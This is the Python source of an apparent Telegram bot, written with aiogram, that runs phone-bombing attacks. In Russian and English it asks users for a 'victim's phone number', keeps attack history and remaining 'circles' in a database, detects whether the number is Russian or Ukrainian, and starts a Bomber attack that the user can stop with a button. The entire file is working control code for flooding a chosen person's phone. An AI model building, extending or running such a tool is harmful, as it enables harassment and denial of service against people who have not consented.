import re 
import asyncio
from datetime import datetime as dt

import globals
from sites import Bomber
from globals import dp, conn, data_users_table

from sqlalchemy import select

from aiogram.types import Message
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton


class Attack_Start(StatesGroup):
    take_phone_func = State()

@dp.message_handler(lambda message: message.text == "💣Атаковать номер")
async def ru_attack_phone(message: Message):
    '''
    Функция, выводящую информацию при нажатии на кнопку "Атаковать"

    Основные данные:
        1. Дата и время
        2. Номер телефона
        3. Количество кругов

    Рускоязычные пользователи.
    '''

    my_data = select([data_users_table]).where(data_users_table.c.user_id==message.from_user.id)
    my_data = conn.execute(my_data).fetchone()

    if my_data == None:
        date = dt.strftime(dt.now(), "%d-%m-%Y %H:%M:%S")

        update_data = data_users_table.insert().values(
                user_id=message.from_user.id, date=date, 
                status=30, last_phone="None", 
                last_date="None"
        )
        conn.execute(update_data)

        await message.answer(
                f"📄Информация о последней атаке ➜\n\n"
                f"📌Вы еще не совершали атаку!\n\n"
                f"☎️Введите номер телефона жертвы(без +)⤵️", 
                )
    else:
        date  = dt.strptime(my_data[4], "%d-%m-%Y %H:%M:%S") if my_data[4] != "None" else "Неизвестно"
        date  = dt.strftime(date, "%d-%m-%Y %H:%M:%S") if date != "Неизвестно" else "Неизвестно"
        phone = f"<code>{my_data[3]}</code>" if my_data[3] != "None" else "<b>Неизвестно</b>"
        
        await message.answer(
                f"📄Информация о последней атаке ➜\n\n"
                f"🕰Время: <b>{date}</b>\n"
                f"📌Номер: {phone}\n"
                f"⏱Осталось кругов: <b>{my_data[2]}</b>\n\n"
                f"☎️Введите номер телефона жертвы(без +)⤵️"
                )

@dp.message_handler(lambda message: message.text == "💣Attack number")
async def eng_attack_phone(message: Message):
    '''
    Функция, выводящую информацию при нажатии на кнопку "Атаковать"

    Основные данные:
        1. Дата и время
        2. Номер телефона
        3. Количество кругов

    Англоязычные пользователи.
    '''

    my_data = select([data_users_table]).where(data_users_table.c.user_id==message.from_user.id)
    my_data = conn.execute(my_data).fetchone()

    if my_data == None:
        date = dt.strftime(dt.now(), "%d-%m-%Y %H:%M:%S")

        update_data = data_users_table.insert().values(
                user_id=message.from_user.id, date=date, 
                status=30, last_phone="None", 
                last_date="None"
        )
        conn.execute(update_data)

        await message.answer(
                f"📄Information about the last attack ➜\n\n"
                f"📌You haven't made an attack yet!\n\n"
                f"☎️Enter the victim's phone number (no +)⤵️", 
                )
    else:
        date  = dt.strptime(my_data[4], "%d-%m-%Y %H:%M:%S") if my_data[4] != "None" else "Unknown"
        date  = dt.strftime(date, "%d-%m-%Y %H:%M:%S") if date != "Unknown" else "Unknown"
        phone = f"<code>{my_data[3]}</code>" if my_data[3] != "None" else "<b>Unknown</b>"
        
        await message.answer(
                f"📄Information about the last attack ➜\n\n"
                f"🕰Time: <b>{date}</b>\n"
                f"📌Phone number: {phone}\n"
                f"⏱Circles left: <b>{my_data[2]}</b>\n\n"
                f"☎️Enter the victim's phone number (no +)⤵️"
                )

@dp.message_handler(lambda message: not message.text.startswith((
        "/msg", "/help",
         "/usd", "/btc", 
         "/bnb", "/eth", 
         "/stat", "/mail", 
         "📲Купить виртуальный номер"))
         )
async def take_phone(message: Message):
    phone = re.sub("[^0-9]", "", message.text)

    if phone.startswith("7") or phone.startswith("8"):
        phone = f"7{phone[1:]}"
        globals.attack_country = "ru"

    elif phone.startswith("38"):
        globals.attack_country = "uk"
        
    else:
        return await message.answer("🔁Не удалось определить страну. Проверьте номер на корректность!", reply=True)

    date = dt.strftime(dt.now(), "%d-%m-%Y %H:%M:%S")

    update_data = data_users_table.update().values(
            last_phone=phone, last_date=date
    ).where(data_users_table.c.user_id==message.from_user.id)
    conn.execute(update_data)

    usl = InlineKeyboardMarkup(
            inline_keyboard = [
                    [InlineKeyboardButton(
                            text="⏹Остановить", callback_data=f"Остановить_{message.from_user.id}")]
            ])

    await message.answer(
            text="▶️Атака началась!\nНажмите кнопку для остановки атаки.", 
            reply_markup = usl
            )

    globals.start_attack = Bomber(user_id=str(message.from_user.id))
    await globals.start_attack.start(message.text, message.from_user.id)
